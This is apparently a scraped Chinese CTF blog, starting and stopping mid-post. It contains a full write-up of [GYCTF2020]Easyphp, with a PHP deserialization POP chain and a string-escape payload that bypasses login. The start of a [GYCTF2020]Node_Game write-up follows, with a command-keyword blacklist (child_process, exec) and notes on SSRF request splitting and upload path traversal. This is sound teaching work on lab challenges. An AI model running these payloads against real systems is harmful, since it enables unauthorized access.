charset=&quot;utf-8&quot;&gt;&lt;title&gt;update&lt;/title&gt;&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;&lt;/html&gt;&#x27;;if ($_SESSION[&#x27;login&#x27;]!=1)&#123;\techo &quot;你还没有登陆呢！&quot;;&#125;$users=new User();$users-&gt;update();if($_SESSION[&#x27;login&#x27;]===1)&#123;\trequire_once(&quot;flag.php&quot;);\techo $flag;&#125;?&gt;\n\n//lib.php  这是这个题目最核心的地方&lt;?phperror_reporting(0);session_start();function safe($parm)&#123;    $array= array(&#x27;union&#x27;,&#x27;regexp&#x27;,&#x27;load&#x27;,&#x27;into&#x27;,&#x27;flag&#x27;,&#x27;file&#x27;,&#x27;insert&#x27;,&quot;&#x27;&quot;,&#x27;\\\\&#x27;,&quot;*&quot;,&quot;alter&quot;);    return str_replace($array,&#x27;hacker&#x27;,$parm);&#125;class User&#123;    public $id;    public $age=null;    public $nickname=null;    public function login() &#123;        if(isset($_POST[&#x27;username&#x27;])&amp;&amp;isset($_POST[&#x27;password&#x27;]))&#123;        $mysqli=new dbCtrl();        $this-&gt;id=$mysqli-&gt;login(&#x27;select id,password from user where username=?&#x27;);        if($this-&gt;id)&#123;        $_SESSION[&#x27;id&#x27;]=$this-&gt;id;        $_SESSION[&#x27;login&#x27;]=1;        echo &quot;你的ID是&quot;.$_SESSION[&#x27;id&#x27;];        echo &quot;你好！&quot;.$_SESSION[&#x27;token&#x27;];        echo &quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;;        return $this-&gt;id;        &#125;    &#125;&#125;    public function update()&#123;        $Info=unserialize($this-&gt;getNewinfo());        $age=$Info-&gt;age;        $nickname=$Info-&gt;nickname;        $updateAction=new UpdateHelper($_SESSION[&#x27;id&#x27;],$Info,&quot;update user SET age=$age,nickname=$nickname where id=&quot;.$_SESSION[&#x27;id&#x27;]);        //这个功能还没有写完 先占坑    &#125;    public function getNewInfo()&#123;        $age=$_POST[&#x27;age&#x27;];        $nickname=$_POST[&#x27;nickname&#x27;];        return safe(serialize(new Info($age,$nickname)));    &#125;    public function __destruct()&#123;        return file_get_contents($this-&gt;nickname);//危    &#125;    public function __toString()    &#123;        $this-&gt;nickname-&gt;update($this-&gt;age);        return &quot;0-0&quot;;    &#125;&#125;class Info&#123;    public $age;    public $nickname;    public $CtrlCase;    public function __construct($age,$nickname)&#123;        $this-&gt;age=$age;        $this-&gt;nickname=$nickname;    &#125;    public function __call($name,$argument)&#123;        echo $this-&gt;CtrlCase-&gt;login($argument[0]);    &#125;&#125;Class UpdateHelper&#123;    public $id;    public $newinfo;    public $sql;    public function __construct($newInfo,$sql)&#123;        $newInfo=unserialize($newInfo);        $upDate=new dbCtrl();    &#125;    public function __destruct()    &#123;        echo $this-&gt;sql;    &#125;&#125;class dbCtrl&#123;    public $hostname=&quot;127.0.0.1&quot;;    public $dbuser=&quot;root&quot;;    public $dbpass=&quot;root&quot;;    public $database=&quot;test&quot;;    public $name;    public $password;    public $mysqli;    public $token;    public function __construct()    &#123;        $this-&gt;name=$_POST[&#x27;username&#x27;];        $this-&gt;password=$_POST[&#x27;password&#x27;];        $this-&gt;token=$_SESSION[&#x27;token&#x27;];    &#125;    public function login($sql)    &#123;        $this-&gt;mysqli=new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database);        if ($this-&gt;mysqli-&gt;connect_error) &#123;            die(&quot;连接失败，错误:&quot; . $this-&gt;mysqli-&gt;connect_error);        &#125;        $result=$this-&gt;mysqli-&gt;prepare($sql);        $result-&gt;bind_param(&#x27;s&#x27;, $this-&gt;name);        $result-&gt;execute();        $result-&gt;bind_result($idResult, $passwordResult);        $result-&gt;fetch();        $result-&gt;close();        if ($this-&gt;token==&#x27;admin&#x27;) &#123;            return $idResult;        &#125;        if (!$idResult) &#123;            echo(&#x27;用户不存在!&#x27;);            return false;        &#125;        if (md5($this-&gt;password)!==$passwordResult) &#123;            echo(&#x27;密码错误！&#x27;);            return false;        &#125;        $_SESSION[&#x27;token&#x27;]=$this-&gt;name;        return $idResult;    &#125;    public function update($sql)    &#123;        //还没来得及写    &#125;&#125;\n\n\n\n我们的注意力应该先放在update.php中，因为这里面出现了flag\nif ($_SESSION[&#x27;login&#x27;]!=1)&#123;\techo &quot;你还没有登陆呢！&quot;;&#125;$users=new User();$users-&gt;update();if($_SESSION[&#x27;login&#x27;]===1)&#123;\trequire_once(&quot;flag.php&quot;);\techo $flag;&#125;\n\n只需要$_SESSION[&#39;login&#39;]=1我们就可以拿到flag，在此之前对lib.php中User()类进行实例化和调用update()函数，我们直接去看函数\nclass User&#123;    public $id;    public $age=null;    public $nickname=null;    public function login() &#123;        if(isset($_POST[&#x27;username&#x27;])&amp;&amp;isset($_POST[&#x27;password&#x27;]))&#123;        $mysqli=new dbCtrl();        $this-&gt;id=$mysqli-&gt;login(&#x27;select id,password from user where username=?&#x27;);        if($this-&gt;id)&#123;        $_SESSION[&#x27;id&#x27;]=$this-&gt;id;        $_SESSION[&#x27;login&#x27;]=1;        echo &quot;你的ID是&quot;.$_SESSION[&#x27;id&#x27;];        echo &quot;你好！&quot;.$_SESSION[&#x27;token&#x27;];        echo &quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;;        return $this-&gt;id;        &#125;    &#125;&#125;    public function update()&#123;        $Info=unserialize($this-&gt;getNewinfo());        $age=$Info-&gt;age;        $nickname=$Info-&gt;nickname;        $updateAction=new UpdateHelper($_SESSION[&#x27;id&#x27;],$Info,&quot;update user SET age=$age,nickname=$nickname where id=&quot;.$_SESSION[&#x27;id&#x27;]);        //这个功能还没有写完 先占坑    &#125;    public function getNewInfo()&#123;        $age=$_POST[&#x27;age&#x27;];        $nickname=$_POST[&#x27;nickname&#x27;];        return safe(serialize(new Info($age,$nickname)));    &#125;    public function __destruct()&#123;        return file_get_contents($this-&gt;nickname);//危    &#125;    public function __toString()    &#123;        $this-&gt;nickname-&gt;update($this-&gt;age);        return &quot;0-0&quot;;    &#125;&#125;\n\n可见，update()函数先调用了getNewinfo()函数，getNewinfo()则是对我们传入参数进行一个操作，先作为参数写入Info()类中并通过__construct()进行赋值(这个对类中参数赋值再进行序列化再替换再进行反序列化的操作只在字符串逃逸的题目里面见过，这题也是)\nclass Info&#123;    public $age;    public $nickname;    public $CtrlCase;    public function __construct($age,$nickname)&#123;        $this-&gt;age=$age;        $this-&gt;nickname=$nickname;    &#125;    public function __call($name,$argument)&#123;        echo $this-&gt;CtrlCase-&gt;login($argument[0]);    &#125;&#125;\n\n字符串逃逸主要是改变一些我们无法改变的变量，现在我还不知道要逃逸什么(应该是$CtrCase)，这题目wp都看不明白\n在变量赋值后就拿着我们的传参作为UpdateHelper类的参数，让我们来看看UpdateHelper类\n$updateAction=new UpdateHelper($_SESSION[&#x27;id&#x27;],$Info,&quot;update user SET age=$age,nickname=$nickname where id=&quot;.$_SESSION[&#x27;id&#x27;]);//$Info为info()类  这里是作为$sql参数，但是参数是不是多了一个，虽然后面那个参数没用就是了Class UpdateHelper&#123;    public $id;    public $newinfo;    public $sql;    public function __construct($newInfo,$sql)&#123;        $newInfo=unserialize($newInfo);        $upDate=new dbCtrl();    &#125;    public function __destruct()    &#123;        echo $this-&gt;sql;    &#125;&#125;\n\n对我们的$_SESSION[&#39;id&#39;]进行反序列化(不知道这个干什么用的)，然后对我们的dbCtrl进行实例化\n然后__destruct()还会触发这个echo估计是用来触发__tostring()\n我们继续来看下dbCtrl类\nclass dbCtrl&#123;    public $hostname=&quot;127.0.0.1&quot;;    public $dbuser=&quot;root&quot;;    public $dbpass=&quot;root&quot;;    public $database=&quot;test&quot;;    public $name;    public $password;    public $mysqli;    public $token;    public function __construct()    &#123;        $this-&gt;name=$_POST[&#x27;username&#x27;];        $this-&gt;password=$_POST[&#x27;password&#x27;];        $this-&gt;token=$_SESSION[&#x27;token&#x27;];    &#125;    public function login($sql)    &#123;        $this-&gt;mysqli=new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database);        if ($this-&gt;mysqli-&gt;connect_error) &#123;            die(&quot;连接失败，错误:&quot; . $this-&gt;mysqli-&gt;connect_error);        &#125;        $result=$this-&gt;mysqli-&gt;prepare($sql);        $result-&gt;bind_param(&#x27;s&#x27;, $this-&gt;name);        $result-&gt;execute();        $result-&gt;bind_result($idResult, $passwordResult);        $result-&gt;fetch();        $result-&gt;close();        if ($this-&gt;token==&#x27;admin&#x27;) &#123;            return $idResult;        &#125;        if (!$idResult) &#123;            echo(&#x27;用户不存在!&#x27;);            return false;        &#125;        if (md5($this-&gt;password)!==$passwordResult) &#123;            echo(&#x27;密码错误！&#x27;);            return false;        &#125;        $_SESSION[&#x27;token&#x27;]=$this-&gt;name;        return $idResult;    &#125;    public function update($sql)    &#123;        //还没来得及写    &#125;&#125;\n\n除了一个__construct()会自己触发其他的就停了我们看下login()函数发现这是一个sql执行函数，会返回false和true，具体逻辑等下再看\n我们已经基本看完代码了，我们还没发现突破口，只能搜一下$_SESSION[&#39;login&#39;]，发现\nclass User&#123;    public $id;    public $age=null;    public $nickname=null;    public function login() &#123;        if(isset($_POST[&#x27;username&#x27;])&amp;&amp;isset($_POST[&#x27;password&#x27;]))&#123;        $mysqli=new dbCtrl();        $this-&gt;id=$mysqli-&gt;login(&#x27;select id,password from user where username=?&#x27;);        if($this-&gt;id)&#123;        $_SESSION[&#x27;id&#x27;]=$this-&gt;id;        $_SESSION[&#x27;login&#x27;]=1;        echo &quot;你的ID是&quot;.$_SESSION[&#x27;id&#x27;];        echo &quot;你好！&quot;.$_SESSION[&#x27;token&#x27;];        echo &quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;;        return $this-&gt;id;        &#125;    &#125;&#125;\n\n发现我们只要让login()函数返回true即可获得flag，我们再回去看下\n我\n"},{"title":"[GYCTF2020]Easyphp","url":"/2025/09/06/GYCTF2020-Easyphp-1/","content":"[GYCTF2020]Easyphp题目界面是一个登录框发现存在admin账号而且存在密码错误的提示，然后访问www.zip成功下载源码\n核心代码lib.php\n&lt;?phperror_reporting(0);session_start();function safe($parm)&#123;    $array= array(&#x27;union&#x27;,&#x27;regexp&#x27;,&#x27;load&#x27;,&#x27;into&#x27;,&#x27;flag&#x27;,&#x27;file&#x27;,&#x27;insert&#x27;,&quot;&#x27;&quot;,&#x27;\\\\&#x27;,&quot;*&quot;,&quot;alter&quot;);    return str_replace($array,&#x27;hacker&#x27;,$parm);&#125;class User&#123;    public $id;    public $age=null;    public $nickname=null;    public function login() &#123;        if(isset($_POST[&#x27;username&#x27;])&amp;&amp;isset($_POST[&#x27;password&#x27;]))&#123;        $mysqli=new dbCtrl();        $this-&gt;id=$mysqli-&gt;login(&#x27;select id,password from user where username=?&#x27;);        if($this-&gt;id)&#123;        $_SESSION[&#x27;id&#x27;]=$this-&gt;id;        $_SESSION[&#x27;login&#x27;]=1;        echo &quot;你的ID是&quot;.$_SESSION[&#x27;id&#x27;];        echo &quot;你好！&quot;.$_SESSION[&#x27;token&#x27;];        echo &quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;;        return $this-&gt;id;        &#125;    &#125;&#125;    public function update()&#123;        $Info=unserialize($this-&gt;getNewinfo());//这里是字符串逃逸的开始        $age=$Info-&gt;age;        $nickname=$Info-&gt;nickname;        $updateAction=new UpdateHelper($_SESSION[&#x27;id&#x27;],$Info,&quot;update user SET age=$age,nickname=$nickname where id=&quot;.$_SESSION[&#x27;id&#x27;]);        //这个功能还没有写完 先占坑    &#125;    public function getNewInfo()&#123;        $age=$_POST[&#x27;age&#x27;];        $nickname=$_POST[&#x27;nickname&#x27;];        return safe(serialize(new Info($age,$nickname)));    &#125;    public function __destruct()&#123;        return file_get_contents($this-&gt;nickname);//危    &#125;    public function __toString()    &#123;        $this-&gt;nickname-&gt;update($this-&gt;age);        return &quot;0-0&quot;;    &#125;&#125;class Info&#123;    public $age;    public $nickname;    public $CtrlCase;    public function __construct($age,$nickname)&#123;        $this-&gt;age=$age;        $this-&gt;nickname=$nickname;    &#125;    public function __call($name,$argument)&#123;        echo $this-&gt;CtrlCase-&gt;login($argument[0]);    &#125;&#125;Class UpdateHelper&#123;    public $id;    public $newinfo;    public $sql;    public function __construct($newInfo,$sql)&#123;//这里传进来的参数和后面的代码都会报错所以update语句那条路是错的        $newInfo=unserialize($newInfo);//这个反序列化不能用        $upDate=new dbCtrl();    &#125;    public function __destruct()    &#123;        echo $this-&gt;sql;    &#125;&#125;class dbCtrl&#123;    public $hostname=&quot;127.0.0.1&quot;;    public $dbuser=&quot;root&quot;;    public $dbpass=&quot;root&quot;;    public $database=&quot;test&quot;;    public $name;    public $password;    public $mysqli;    public $token;    public function __construct()    &#123;        $this-&gt;name=$_POST[&#x27;username&#x27;];        $this-&gt;password=$_POST[&#x27;password&#x27;];        $this-&gt;token=$_SESSION[&#x27;token&#x27;];    &#125;    public function login($sql)    &#123;        $this-&gt;mysqli=new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database);        if ($this-&gt;mysqli-&gt;connect_error) &#123;            die(&quot;连接失败，错误:&quot; . $this-&gt;mysqli-&gt;connect_error);        &#125;        $result=$this-&gt;mysqli-&gt;prepare($sql);        $result-&gt;bind_param(&#x27;s&#x27;, $this-&gt;name);        $result-&gt;execute();        $result-&gt;bind_result($idResult, $passwordResult);        $result-&gt;fetch();        $result-&gt;close();        if ($this-&gt;token==&#x27;admin&#x27;) &#123;            return $idResult;        &#125;        if (!$idResult) &#123;            echo(&#x27;用户不存在!&#x27;);            return false;        &#125;        if (md5($this-&gt;password)!==$passwordResult) &#123;            echo(&#x27;密码错误！&#x27;);            return false;        &#125;        $_SESSION[&#x27;token&#x27;]=$this-&gt;name;        return $idResult;    &#125;    public function update($sql)    &#123;        //还没来得及写    &#125;&#125;\n\n查看登录操作发现虽然对username和password有过滤但是后面还用了预处理语句于是直接注入没有办法了，但是还有一个update.php\nif ($_SESSION[&#x27;login&#x27;]!=1)&#123;\techo &quot;你还没有登陆呢！&quot;;&#125;$users=new User();$users-&gt;update();if($_SESSION[&#x27;login&#x27;]===1)&#123;\trequire_once(&quot;flag.php&quot;);\techo $flag;&#125;\n\n也就是说我们只需要将$_SESSION[&#39;login&#39;]===1进行赋值即可拿到flag，在看完了代码之后才来写题解，都知道怎么写了，已经忘记自己摸索的心情了，就只能写下注释\n直接上链子\n&lt;?phpclass User&#123;    public $id;    public $age=null;    public $nickname=null;    public function update()&#123;        $Info=unserialize($this-&gt;getNewinfo());//经过字符串逃逸的数据进行反序列化        $age=$Info-&gt;age;        $nickname=$Info-&gt;nickname;        $updateAction=new UpdateHelper($_SESSION[&#x27;id&#x27;],$Info,&quot;update user SET age=$age,nickname=$nickname where id=&quot;.$_SESSION[&#x27;id&#x27;]);        //这个功能还没有写完 先占坑    &#125;    public function __destruct()&#123;        return file_get_contents($this-&gt;nickname);//危  我们可以知道flag在falg.php中但是无法打印返回内容    &#125;    public function __toString()    &#123;        $this-&gt;nickname-&gt;update($this-&gt;age);//参数数量和update不对，可以尝试触发_call        return &#x27;0&#x27;;    &#125;&#125;class Info&#123;    public $age=&#x27;1&#x27;;    public $nickname=&#x27;2&#x27;;    public $CtrlCase;    public function __call($name,$argument)&#123;//这个name参数是不存在的函数名        //echo $name;        echo $this-&gt;CtrlCase-&gt;login($argument[0]);//然后触发login方法，且参数我们可控    &#125;&#125;Class UpdateHelper&#123;    public $id;    public $newinfo;    public $sql;    public function __destruct()    &#123;        echo $this-&gt;sql;//虽然前面的代码会有一点错误但是不妨碍以这里为起点，触发__tostring方法    &#125;&#125;class dbCtrl&#123;    public $hostname=&quot;127.0.0.1&quot;;    public $dbuser=&quot;root&quot;;    public $dbpass=&quot;root&quot;;    public $database=&quot;test&quot;;    public $name=&#x27;admin&#x27;;    public $password=&#x27;1&#x27;;    public $mysqli;    public $token;    public function __construct()    &#123;    &#125;    public function login($sql)&#123;        //echo 3;        //echo $sql;    &#125;&#125;$a=new UpdateHelper();$b=new User();$c=new Info();$d=new dbCtrl();$b-&gt;age=&#x27;select &quot;1&quot;,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#x27;;$c-&gt;CtrlCase=$d;$b-&gt;nickname=$c;$a-&gt;sql=$b;echo serialize($a);\n\n我们反序列化触发顺序为\nUpdateHelper::__destruct =&gt; User::__toString =&gt; Info::__call =&gt; dbCtrl::login\n\n我们发现当我们触发login方法的时候参数$sql也就是$age是可以控制的，也就是我们可以直接执行sql语句但是没有回显，于是我们再结合判定条件\n    if ($this-&gt;token==&#x27;admin&#x27;) &#123;        return $idResult;    &#125;    if (!$idResult) &#123;        echo(&#x27;用户不存在!&#x27;);        return false;    &#125;    if (md5($this-&gt;password)!==$passwordResult) &#123;        echo(&#x27;密码错误！&#x27;);        return false;    &#125;    $_SESSION[&#x27;token&#x27;]=$this-&gt;name;//这里可以控制token    return $idResult;&#125;\n\n也就是说只要我们sql语句执行除了经过密码校验然后name为admin就可以对$_SESSION[&#39;token&#39;]进行赋值然后再进行登录的时候直接返回id\n$this-&gt;id=$mysqli-&gt;login(&#x27;select id,password from user where username=?&#x27;);if($this-&gt;id)&#123;$_SESSION[&#x27;id&#x27;]=$this-&gt;id;$_SESSION[&#x27;login&#x27;]=1;echo &quot;你的ID是&quot;.$_SESSION[&#x27;id&#x27;];echo &quot;你好！&quot;.$_SESSION[&#x27;token&#x27;];echo &quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;;return $this-&gt;id;&#125;\n\n于是可以直接到update.php中去拿到flag\n于是我们使用\nselect id,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?#也可以把id换成 1\n\n由于我们执行的时候是没有传入username的所以是返回所有数据，当然我们也可以将username赋值为adimn，然后id正常是从1开始的，后面的字符串则是1的MD5值用来过密码校验\n我们光拿到反序列化数据还不够，这次不能直接反序列化我们需要配合字符串逃逸进行反序列化\nO:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:72:&quot;select &quot;1&quot;,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:1:&quot;1&quot;;s:8:&quot;nickname&quot;;s:1:&quot;2&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;N;&#125;&#125;&#125;&#125;\n\n这里总共有461个字符，也就是需要逃逸445个\n我们再来看看需要逃逸的序列化数据和参数\nO:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:1:&quot;1&quot;;s:8:&quot;nickname&quot;;s:1:&quot;2&quot;;s:8:&quot;CtrlCase&quot;;N;&#125;\n\n我们需要在2的那个位置开始，还不能影响到其他参数，于是我们还需要加上后面的参数，一开始我还不知道怎么办，后面知道了只要将pop链作为对象赋值给任意一个参数即可，为了方便我逃逸的是CtrlCase参数\n&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:72:&quot;select &quot;1&quot;,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:1:&quot;1&quot;;s:8:&quot;nickname&quot;;s:1:&quot;2&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;N;&#125;&#125;&#125;&#125;&#125;\n\n这才是我们需要逃逸的完整字符串462个字符，最后就是\n************************************************************************************************loadunion\n\n结合起来就是\nage=1&amp;nickname=***********************************************************************************************loadunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:72:&quot;select &quot;1&quot;,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:1:&quot;1&quot;;s:8:&quot;nickname&quot;;s:1:&quot;2&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;N;&#125;&#125;&#125;&#125;&#125;\n\n成功返回1\n\n\n然后回到登录界面登录admin账号密码任意即可拿到flag\n\n"},{"title":"[GYCTF2020]Node_Game","url":"/2025/05/22/GYCTF2020-Node-Game/","content":"[GYCTF2020]Node_Game界面有两个选项，一个是源代码一个是文件上传界面，看了题解后发现解题和那个文件上传界面没什么关系，是通过脚本进行的\n我们先进行代码审计\nvar express = require(&#x27;express&#x27;);var app = express();var fs = require(&#x27;fs&#x27;);var path = require(&#x27;path&#x27;); // 处理文件路径var http = require(&#x27;http&#x27;);var pug = require(`pug`); // 模板渲染var morgan = require(&#x27;morgan&#x27;); // 日志const multer = require(&#x27;multer&#x27;); // 用于处理multipart/form-data类型的表单数据，实现上传功能；个人一般使用formidable实现上传 // 将上传的文件存储在./dist[自动创建]返回一个名为file的文件数组app.use(multer(&#123;dest: &#x27;./dist&#x27;&#125;).array(&#x27;file&#x27;));// 使用简化版日志app.use(morgan(&#x27;short&#x27;)); // 静态文件路由 express.static中间件用于提供静态文件服务。访问/uploads和/template路由时，将分别从项目目录下的/uploads和/template目录中提供文件。app.use(&quot;/uploads&quot;, express.static(path.join(__dirname, &#x27;/uploads&#x27;)))app.use(&quot;/template&quot;, express.static(path.join(__dirname, &#x27;/template&#x27;))) app.get(&#x27;/&#x27;, function (req, res) &#123;    // GET方法获取action参数    var action = req.query.action ? req.query.action : &quot;index&quot;;    // action中不能包含/  \\\\    if (action.includes(&quot;/&quot;) || action.includes(&quot;\\\\&quot;)) &#123;        res.send(&quot;Errrrr, You have been Blocked&quot;);    &#125;    // 将/template/[action].pug渲染成html输出到根目录    file = path.join(__dirname + &#x27;/template/&#x27; + action + &#x27;.pug&#x27;);    var html = pug.renderFile(file);    res.send(html);//访问路径为file的文件//将 html 变量的内容作为 HTTP 响应的主体发送给请求方。&#125;); app.post(&#x27;/file_upload&#x27;, function (req, res) &#123;    var ip = req.connection.remoteAddress; // remoteAddress无法伪造，因为TCP有三次握手，伪造源IP会导致无法完成TCP连接    var obj = &#123;msg: &#x27;&#x27;,&#125;//创建了一个包含msg属性的对象，初始值为空字符串    // 请求必须来自localhost    if (!ip.includes(&#x27;127.0.0.1&#x27;)) &#123;        obj.msg = &quot;only admin&#x27;s ip can use it&quot;        res.send(JSON.stringify(obj));//JSON.stringify()方法用于将JavaScript值转换为JSON字符        return    &#125;    // node.js读取文件 fs.readFile(),一种格式fs.readFile(filePath,&#123;encoding:&quot;utf-8&quot;&#125;, function (err, fr)&#123;    fs.readFile(req.files[0].path, function (err, data) &#123;        // 判断上传文件合法        if (err) &#123;            obj.msg = &#x27;upload failed&#x27;;            res.send(JSON.stringify(obj));        &#125; else &#123;            // 文件路径为/uploads/[mimetype]/filename，mimetype可以进行目录穿越实现将文件存储至/template并利用action渲染到界面            var file_path = &#x27;/uploads/&#x27; + req.files[0].mimetype + &quot;/&quot;;            var file_name = req.files[0].originalname            var dir_file = __dirname + file_path + file_name            if (!fs.existsSync(__dirname + file_path)) &#123;                try &#123;                    fs.mkdirSync(__dirname + file_path)                &#125; catch (error) &#123;                    obj.msg = &quot;file type error&quot;;                    res.send(JSON.stringify(obj));                    return                &#125;            &#125;            try &#123;                fs.writeFileSync(dir_file, data)                obj = &#123;msg: &#x27;upload success&#x27;, filename: file_path + file_name&#125;            &#125; catch (error) &#123;                obj.msg = &#x27;upload failed&#x27;;            &#125;            res.send(JSON.stringify(obj));        &#125;    &#125;)&#125;) // 查看题目源码app.get(&#x27;/source&#x27;, function (req, res) &#123;    res.sendFile(path.join(__dirname + &#x27;/template/source.txt&#x27;));&#125;); // ssrf核心 app.get(&#x27;/core&#x27;, function (req, res) &#123;    var q = req.query.q;//用于获取HTTP请求中查询参数的方式 例：?q=nodejs返回nodejs    var resp = &quot;&quot;;    if (q) &#123;        var url = &#x27;http://localhost:8081/source?&#x27; + q        console.log(url)//变量 url 的值输出到控制台        // 对url字符进行waf        var trigger = blacklist(url);        if (trigger === true) &#123;            res.send(&quot;error occurs!&quot;);        &#125; else &#123;            try &#123;                // node对/source发出请求，此处可以利用字符破坏进行切分攻击访问/file_upload路由(❗️此请求发出者为localhost主机)，实现对remoteAddress的绕过                http.get(url, function (resp) &#123;                    resp.setEncoding(&#x27;utf8&#x27;);                    resp.on(&#x27;error&#x27;, function (err) &#123;                        if (err.code === &quot;ECONNRESET&quot;) &#123;                            console.log(&quot;Timeout occurs&quot;);                        &#125;                    &#125;);                    // 返回结果输出到/core                    resp.on(&#x27;data&#x27;, function (chunk) &#123;                        try &#123;                            resps = chunk.toString();                            res.send(resps);                        &#125; catch (e) &#123;                            res.send(e.message);                        &#125;                    &#125;).on(&#x27;error&#x27;, (e) =&gt; &#123;                        res.send(e.message);//e=error                    &#125;);                &#125;);            &#125; catch (error) &#123;                console.log(error);            &#125;        &#125;    &#125; else &#123;        res.send(&quot;search param &#x27;q&#x27; missing!&quot;);    &#125;&#125;) // 关键字waf 利用字符串拼接实现绕过function blacklist(url) &#123;    var evilwords = [&quot;global&quot;, &quot;process&quot;, &quot;mainModule&quot;, &quot;require&quot;, &quot;root&quot;, &quot;child_process&quot;, &quot;exec&quot;, &quot;\\&quot;&quot;, &quot;&#x27;&quot;, &quot;!&quot;];    var arrayLen = evilwords.length;     for (var i = 0; i &lt; arrayLen; i++) &#123;        const trigger = url.includes(evilwords[i]);//includes() 是 JavaScript 字符串的方法，用于判断该字符串是否包含指定的子字符串。它返回一个布尔值：如果包含返回 true，否则返回 false。        if (trigger === true) &#123;            return true        &#125;    &#125;&#125; //启动一个监听在8081端口的Express.js服务器var server = app.listen(8081, function () &#123;    var host = server.address().address    var port = server.address().port    console.log(&quot;Example app listening at http://%s:%s&quot;, host, port)&#125;)\n\n我们在进行文件上传的时候发现只有本地用户才能文件上传，但是无论怎么改请求头都不能改ip为127.0.0.1\n这个代码有点复杂，如果不从头分析，我怕是这辈子都看不懂，审计代码也太难了吧，我们先一部分一部分看\n我们首先从各个路由来分析源码\napp.get(&#x27;/&#x27;, function (req, res) &#123;    // GET方法获取action参数    var action = req.query.action ? req.query.action : &quot;index&quot;;    // action中不能包含/  \\\\    if (action.includes(&quot;/&quot;) || action.includes(&quot;\\\\&quot;)) &#123;        res.send(&quot;Errrrr, You have been Blocked&quot;);    &#125;    // 将/template/[action].pug渲染成html输出到根目录    file = path.join(__dirname + &#x27;/template/&#x27; + action + &#x27;.pug&#x27;);    var html = pug.renderFile(file);    res.send(html);//访问路径为file的文件//将 html 变量的内容作为 HTTP 响应的主体发送给请求方。&#125;);\n\n更目录下我们传入action参数，会被过滤掉两个斜杠，应该是为了防止转义和目录跨越。经过过滤后就会加载[action].pug模块，并渲染到更目录，还注意到文件上传界面实际上是传入参数action=upload从而进行渲染\n下一个路由\napp.post(&#x27;/file_upload&#x27;, function (req, res) &#123;    var ip = req.connection.remoteAddress; // remoteAddress无法伪造，因为TCP有三次握手，伪造源IP会导致无法完成TCP连接    var obj = &#123;msg: &#x27;&#x27;,&#125;//创建了一个包含msg属性的对象，初始值为空字符串    // 请求必须来自localhost    if (!ip.includes(&#x27;127.0.0.1&#x27;)) &#123;        obj.msg = &quot;only admin&#x27;s ip can use it&quot;        res.send(JSON.stringify(obj));//JSON.stringify()方法用于将JavaScript值转换为JSON字符        return    &#125;    // node.js读取文件 fs.readFile(),一种格式fs.readFile(filePath,&#123;encoding:&quot;utf-8&quot;&#125;, function (err, fr)&#123;    fs.readFile(req.files[0].path, function (err, data) &#123;        // 判断上传文件合法        if (err) &#123;            